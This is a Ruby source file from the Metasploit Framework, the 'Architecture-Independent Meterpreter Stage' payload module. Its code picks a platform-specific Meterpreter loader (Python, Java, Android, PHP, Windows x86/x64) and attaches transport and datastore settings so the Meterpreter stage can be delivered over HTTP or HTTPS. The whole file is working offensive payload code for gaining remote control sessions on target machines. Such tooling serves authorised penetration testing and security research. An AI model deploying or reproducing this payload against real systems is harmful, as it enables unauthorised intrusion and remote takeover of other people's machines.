##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# Injects the meterpreter server DLL via the Reflective Dll Injection payload
# along with transport related configuration.
#
###

module MetasploitModule
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Architecture-Independent Meterpreter Stage',
        'Description' => 'Handle Meterpreter sessions regardless of the target arch/platform',
        'Author' => ['OJ Reeves'],
        'PayloadCompat' => { 'Convention' => 'http https' },
        'License' => MSF_LICENSE,
        'Platform' => ['multi'],
        'Arch' => ARCH_ALL,
        'Session' => Msf::Sessions::Meterpreter_Multi
      )
    )
  end

  def stage_payload(opts = {})
    return '' unless opts[:uuid]

    ## TODO: load the datastore "stuff" from the JSON file
    ## and wire it into opts[:datastore].
    ## and if we find an instance, hydrate based on that.
    ## otherwise use some "sane defaults" as shown below.

    c = Class.new(::Msf::Payload)
    c.include(::Msf::Payload::Stager)

    case opts[:uuid].platform
    when 'python'
      c.include(::Msf::Payload::Python::MeterpreterLoader)
    when 'java'
      c.include(::Msf::Payload::Java::MeterpreterLoader)
    when 'android'
      c.include(::Msf::Payload::Android::MeterpreterLoader)
    when 'php'
      c.include(::Msf::Payload::Php::MeterpreterLoader)
    when 'windows'
      if opts[:uuid].arch == ARCH_X86
        c.include(::Msf::Payload::Windows::MeterpreterLoader)
      else
        c.include(::Msf::Payload::Windows::MeterpreterLoader_x64)
      end
    else
      return ''
    end

    second_stage = c.new

    # wire in the appropriate values for transport and datastore configs
    opts[:transport_config] = [transport_config(opts)]
    opts[:datastore] = datastore

    second_stage.stage_payload(opts)
  end
end
